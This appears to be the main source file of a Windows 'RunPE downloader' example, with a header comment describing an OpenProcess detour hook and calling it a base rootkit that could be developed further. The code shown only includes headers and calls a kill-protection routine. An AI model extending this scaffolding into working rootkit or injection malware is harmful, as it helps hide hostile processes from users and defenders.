

/* 
	RUNPE DOWNLOADER EXAMPLE WITH SIMPLE OpenProcess detour hook - MAIN SOURCE 
	# USING uncHOOK method 
	[-] No auto startup indeed
	[+] Colud be developed to be a simple rootkit , some of good api's to hook has been listed in the function 'HookInstallFunc'

	Note : this is just an exmaple of the base rootkits to show you how does rootkits work , !? not ready to use as a real rootkit .

*/


#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <iostream>

#include "Settings.h"
#include "Hooks.h"
#include "Funcs.h"


int main()
{
	if(UNCKILLPROTECT()) 
		printf("\nDone");
	else
		printf("\nError occurred <!>");
}


